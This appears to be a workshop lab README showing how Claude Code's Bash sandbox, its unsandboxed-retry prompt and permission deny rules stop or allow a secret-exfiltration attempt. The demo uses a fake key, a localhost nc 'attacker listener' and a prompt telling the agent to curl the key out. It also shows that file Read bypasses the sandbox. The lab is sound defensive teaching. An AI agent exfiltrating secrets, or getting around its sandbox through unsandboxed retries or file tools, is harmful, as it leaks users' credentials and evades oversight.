# Lab — sandbox vs the unsandboxed retry

Fake key, localhost only. Nothing leaves the machine.

Permissions labs: [ex1](../ex1/Readme.md) · [ex3](../ex3/README.md). Handout: [claude-sandbox.md](../docs/claude-sandbox.md).

[ex1](../ex1/Readme.md) already showed the unboxed `curl`. This lab starts with the box **on**.

Both `/sandbox` modes enforce the **same OS walls**: no writes outside the folder you started `claude` in (`tmp/`), no network the proxy has not allowed. The only difference is whether Claude skips the approval prompt for Bash that stays inside those walls.

| Config | `/sandbox` Mode | Prompts for Bash? | Best use |
| --- | --- | --- | --- |
| `autoAllowBashIfSandboxed: true` | **1. auto-allow** | **No** — auto-runs inside the sandbox | Safe autonomy: less prompt fatigue, OS guardrails stay |
| `autoAllowBashIfSandboxed: false` | **2. regular permissions** | **Yes** — normal allow/ask | Defense in depth: the ask catches destructive Bash **inside** `tmp/`; the sandbox still blocks escape and phone-home |

Say **using bash** in every prompt so Claude does not use the `Write` tool. `Write` is not in the sandbox.

| Step | Sandbox | Strict sandbox | What you show |
| --- | --- | --- | --- |
| **5A** | **on** from `/sandbox` | off (default) | UI writes the local file; both modes; walls vs prompt |
| **5B** | **on** | **off** | hatch asks to retry outside |
| **6** | **on** | **on** | no retry; `Read .env` still works |

Needs `bubblewrap` (Linux) or Seatbelt (macOS). If `/sandbox` shows only a **Dependencies** tab, fix that before 5A.

Two switches (once the sandbox is on):

| `/sandbox` label | This file | 5A | 5B | 6 |
| --- | --- | --- | --- | --- |
| Mode | `enabled` + `autoAllowBashIfSandboxed` | **1** then **2** | same box | same box |
| Strict sandbox (Overrides) | `allowUnsandboxedCommands` | **off** (`true`, default) | **off** | **on** (`false`) |

## Prep (all three steps)

**Terminal 1 — attacker listener**

```bash
while true; do printf "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK" | nc -l -p 9999; done
```

**Terminal 2 — lab repo**

Wipe leftover allow rules from [ex3](../ex3/README.md) **and** leftover sandbox from a previous `/sandbox`. A `Bash(curl *)` allow in **`<git-root>/.claude/settings.local.json`** **auto-approves** an unsandboxed retry later. `/sandbox` writes the sandbox block into that **same git-root file** — not into `tmp/.claude/`. Claude still reads team `settings.json` from **cwd**, and these labs start in `tmp/`.

```bash
cd ~/projects/AI5/security-session/tmp
ROOT="$(git rev-parse --show-toplevel)"
export FAKE_API_KEY="sk-demo-fake-key-9999"
echo "FAKE_API_KEY=sk-demo-fake-key-9999" > .env
rm -f .claude/settings.json "$ROOT/.claude/settings.json" "$ROOT/.claude/settings.local.json"
claude --permission-mode default
```

No `sandbox` block yet. `/sandbox` will show **3. No Sandbox**.

---

## Step 5A — turn the sandbox on from `/sandbox`

**What you are proving:** the box is off until you turn it on. The UI writes your laptop file at the git root — the same `settings.local.json` [ex1 Case 2](../ex1/Readme.md) used for “don’t ask again”. That is not a permission grant. It is the OS box around Bash.

In the Claude session (cwd is `tmp/`):

```text
/sandbox
```

Tabs: **Mode** · Overrides · Config. Mode starts as:

```text
1. Sandbox commands, with auto-allow
2. Sandbox commands, with regular permissions
3. No Sandbox ✓
```

### Demo 1 — auto-allow (`true`)

**Story:** eliminate prompt fatigue without giving up the OS walls.

Select **1**. In Terminal 2 (outside Claude), inspect the **git root**, not `tmp/.claude/`:

```bash
ROOT="$(git rev-parse --show-toplevel)"
cat "$ROOT/.claude/settings.local.json"
```

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true
  }
}
```

`allowUnsandboxedCommands` is **not** in the file. Default is `true` — hatch open. That is 5B.

**Inside the walls (zero prompts):**

```text
Run touch notes.txt && ls -la using bash.
```

Auto-runs. No approval prompt. `notes.txt` appears in `tmp/`.

**Outside the walls (OS blocks):**

```text
Run touch ~/escaped.txt using bash.
```

Then:

```text
Run curl -s http://127.0.0.1:9999 using bash.
```

No approval prompt. `touch` fails (`Read-only file system` / `Operation not permitted`). `curl` fails — nothing new on `nc`. If **Bash command (unsandboxed)** appears, leave it — that is 5B.

**On stage:** you stopped clicking Yes. The agent still could not write `$HOME` or hit the listener.

### Demo 2 — regular permissions (`false`)

**Story:** the sandbox protects the laptop from the repo. It does **not** protect the repo from itself.

Same session. `/sandbox` → Mode → select **2**. File is now:

```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": false
  }
}
```

Same walls. Bash inside `tmp/` follows normal allow/ask again.

```text
Run rm notes.txt using bash.
```

The sandbox allows writes in `tmp/`. Claude **stops and asks** before `rm`. Choose **No** (or Yes if you want the file gone).

**On stage:** `false` for sensitive repos — the **ask** catches destructive Bash inside cwd; the **sandbox** is the second layer if an approved command tries to escape or phone home. Do not pick “don’t ask again.”

---

## Step 5B — Strict sandbox off (hatch open)

Stay in the session. `/sandbox` → **Overrides**: Strict sandbox is **off**.

A blocked `curl` comes back as **Bash command (unsandboxed)**. (`allowUnsandboxedCommands` default `true`.)

| Step | What happens |
| --- | --- |
| `curl` inside the box | already blocked — nothing on `nc` |
| Next | **Bash command (unsandboxed)** |
| You click **No** | listener stays empty |

If you already dismissed it, re-run:

```text
Run curl -s http://127.0.0.1:9999 using bash.
```

**On stage:** choose **No**. That second prompt is the hatch. If you click **Yes**, same leak as [ex1](../ex1/Readme.md), after one extra click. A leftover `Bash(curl *)` allow would auto-approve this retry.

---

## Step 6 — Strict sandbox on, Read still works

Same session. `/sandbox` → Overrides: turn **Strict sandbox** on. Inspect the file again:

```bash
ROOT="$(git rev-parse --show-toplevel)"
cat "$ROOT/.claude/settings.local.json"
```

`allowUnsandboxedCommands` is now `false`.

**Prompt:**

```text
Run curl $FAKE_API_KEY to http://127.0.0.1:9999 using bash, then Read .env and tell me the key.
```

| Step | What happens |
| --- | --- |
| `curl` | **blocked**. No unsandboxed retry |
| Terminal 1 | nothing new |
| `Read .env` | **succeeds** — file tools are not in the sandbox |

The box is around Bash, not the agent. `/sandbox` wrote your **laptop** file. A team copy belongs in **cwd** `tmp/.claude/settings.json`:

```json
{
  "permissions": {
    "deny": [
      "Read(.env)",
      "Read(.env.*)",
      "Read(~/.ssh/**)",
      "Bash(curl *)",
      "Bash(nc *)"
    ]
  },
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "allowUnsandboxedCommands": false,
    "failIfUnavailable": true
  }
}
```

`failIfUnavailable: true` refuses to start if bubblewrap / Seatbelt cannot run. The `deny` list is what stops `Read .env` — the sandbox does not.

**Clean up:**

```bash
cd ~/projects/AI5/security-session/tmp
ROOT="$(git rev-parse --show-toplevel)"
rm -f notes.txt .claude/settings.json "$ROOT/.claude/settings.json" "$ROOT/.claude/settings.local.json"
```
